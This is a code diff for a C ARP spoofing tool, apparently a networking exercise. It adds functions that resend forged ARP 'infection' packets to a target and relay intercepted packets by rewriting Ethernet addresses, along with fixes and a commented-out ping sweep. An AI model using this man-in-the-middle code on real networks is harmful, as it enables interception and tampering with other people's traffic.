@@ -1,4 +1,4 @@
-#include "arp_spoofing.h"
+﻿#include "arp_spoofing.h"
 
 void usage()
 {
@@ -61,6 +61,40 @@ void GetSvrIPAddress(uint32_t* dst)
     pclose(fp);
 }
 
+//void GetFakeIPAddress(uint32_t* dst)
+//{
+//    char my_ip[20];
+//    {
+//        FILE* fp = popen("hostname -I", "r");
+
+//        if( !fgets(my_ip, 20, fp) )
+//            printf("IP assigning error!\n");
+
+//        pclose(fp);
+//    }
+
+//    int last_dot_loc = 0;
+//    for(int i = 0; my_ip[i] != 0; i++) {
+//        if( my_ip[i] == '.' )
+//            last_dot_loc = i;
+//    }
+//    my_ip[last_dot_loc+1] = 0;
+
+//    for(int i = 0; i < 0xFF; i++)
+//    {
+//        FILE* fp;
+//        char command[100] = {0, };
+
+//        // ping 1 times
+//        strcat(command, "ping ");
+//        strcat(command, ip);
+//        strcat(command, " -c 1");
+
+//        fp = popen(command, "r");
+//        pclose(fp);
+//    }
+//}
+
 int is_ip_packet(const uint8_t* packet)
 {
     // Input: A packet which we want to check if the packet is arp or not
@@ -74,14 +108,14 @@ int is_ip_packet(const uint8_t* packet)
 void get_target_mac_from_arp_table(uint8_t* dst, const uint8_t* packet, addr_pair* address_table, int table_size)
 {
     // finally, what we want is 'target's mac address
-    struct libnet_ethernet_hdr* e = nullptr;
-    struct libnet_ipv4_hdr* i = nullptr;
+    struct libnet_ethernet_hdr e;
+    struct libnet_ipv4_hdr i;
 
-    memcpy(e, &packet[0], LIBNET_ETH_H);
-    memcpy(i, &packet[LIBNET_ETH_H], LIBNET_IPV4_H);
+    memcpy(&e, &packet[0], LIBNET_ETH_H);
+    memcpy(&i, &packet[LIBNET_ETH_H], LIBNET_IPV4_H);
 
     for(int i = 0; i < table_size; i++) {
-        if( !memcmp(e->ether_dhost, &address_table[i], MAC_SIZE) ) {
+        if( !memcmp(e.ether_dhost, &address_table[i], MAC_SIZE) ) {
             memcpy(dst, address_table[i].tgt_mac, MAC_SIZE);
             return;
         }
@@ -93,10 +127,6 @@ void get_target_mac_from_arp_table(uint8_t* dst, const uint8_t* packet, addr_pai
 void set_relay_packet(const uint8_t* packet, uint8_t* target_mac, uint8_t* my_mac)
 {
     struct libnet_ethernet_hdr *e = (struct libnet_ethernet_hdr*)&packet[0];
-
-    // set sender's mac to my mac
-    // set target's mac to original target's mac
-    // and we don't need to modify any ip address
 
     memcpy(e->ether_dhost, target_mac, MAC_SIZE);
     memcpy(e->ether_shost, my_mac, MAC_SIZE);
@@ -122,20 +152,6 @@ int get_session_location(uint8_t* target_mac, addr_pair* address_table, int sess
     return (i < session_size ? i : 0);
 }
 
-void Print(const uint8_t* list, int list_length, int list_size, const char* message)
-{
-    for(int i = 0; i < list_size; i++)
-    {
-        printf("%dth %s session\n", i+1, message);
-        for(int j = 0; j < list_length; j++)
-        {
-            printf("%.2X ", list[j]);
-            if( j % 16 == 15) printf("\n");
-        }
-        printf("\n\n");
-    }
-}
-
 void get_mac_from_ip(uint8_t* dst_mac, const char* ip)
 {
     {
@@ -157,7 +173,7 @@ void get_mac_from_ip(uint8_t* dst_mac, const char* ip)
 
         strcat(command, "arp -n | grep ^");
         strcat(command, ip);
-        strcat(command, " | awk '{print $3}'");
+        strcat(command, "[^0-9] | awk '{print $3}'");   // 10.1.1.1 vs 10.1.1.101
 
         fp = popen(command, "r");
 
@@ -181,7 +197,39 @@ void get_mac_from_ip(uint8_t* dst_mac, const char* ip)
     }
 }
 
+void send_infection_packet(pcap_t* handle, const uint8_t* packet, arp_packet* arp_lists,
+                           addr_pair* address_table, int session_size)
+{
+    uint8_t target_mac[MAC_SIZE] = {0, };
 
+    get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
+    if( !strlen((char*)target_mac) ) return;  // continue if the sender was not in our table
+
+    int i = get_session_location(target_mac, address_table, session_size);
+    for(int cnt = 0; cnt < 3; cnt++) // send packet three times
+    {
+        sleep(1);   // make term before we send arp packet
+        if( pcap_sendpacket(handle, (const uint8_t*)&arp_lists[i], sizeof(arp_packet)) ) {
+            printf("broadcast arp packet sending failed\n");
+            return;
+        }
+    }
+}
+
+void send_relay_packet(pcap_t* handle, const uint8_t* packet, addr_pair* address_table, int session_size, int packet_size)
+{
+    uint8_t target_mac[MAC_SIZE] = {0, }, my_mac[MAC_SIZE] = {0, };
+    GetSvrMACAddress(my_mac);
+    get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
+
+    if( !strlen((char*)target_mac) ) return;  // return if that target mac was not in arp table
+
+    set_relay_packet(packet, target_mac, my_mac);
+    if( pcap_sendpacket(handle, packet, packet_size)) {
+        printf("relay packet sending failed\n");
+        return;
+    }
+}
 
 
 
